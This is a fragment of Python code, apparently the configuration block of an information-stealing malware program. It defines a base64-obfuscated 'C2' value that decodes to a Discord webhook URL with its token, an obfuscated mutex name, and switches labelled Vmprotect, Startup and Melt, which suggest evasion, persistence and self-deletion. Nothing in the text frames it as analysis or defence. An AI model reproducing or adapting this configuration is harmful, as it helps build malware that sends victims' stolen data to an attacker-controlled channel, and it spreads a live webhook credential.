...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1MzYwMDYzOTg2ODM1MDQ4NS9rekg0ZlZrZGJnRHhJZnlKOTV4ZzBuOUlsWmRmNnpKVDAzWnZ5eEFZVGlEcERpR0xhSmdpbjNaNlV5QjdVcndnZEJ0Sw==').decode())
    Mutex = base64.b64decode('c1Rlcm5pZTVuOFIxb1NROA==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
